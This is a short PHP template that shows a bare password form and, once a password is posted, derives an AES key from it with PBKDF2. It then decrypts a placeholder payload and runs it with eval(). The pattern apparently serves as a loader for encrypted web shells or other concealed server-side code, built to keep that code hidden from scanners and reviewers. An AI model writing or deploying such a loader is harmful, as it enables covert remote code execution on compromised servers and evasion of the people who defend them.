<?php

if (!array_key_exists('a', $_POST)) {
    print '<form method="POST" onsubmit="sessionStorage.setItem(\'a\', document.getElementsByTagName(\'input\')[0].value);"><input type="password" name="a" /></form>';
    exit;
}

$salt = base64_decode('{{SALT}}');
$iv = base64_decode('{{IV}}');
$payload_encrypted = '{{PAYLOAD}}';
$key_length = 16;
$key = hash_pbkdf2('sha256', $_POST['a'], $salt, 1000, $key_length * 2);
$payload = openssl_decrypt($payload_encrypted, 'AES-256-CTR', $key, 0, $iv);
eval($payload);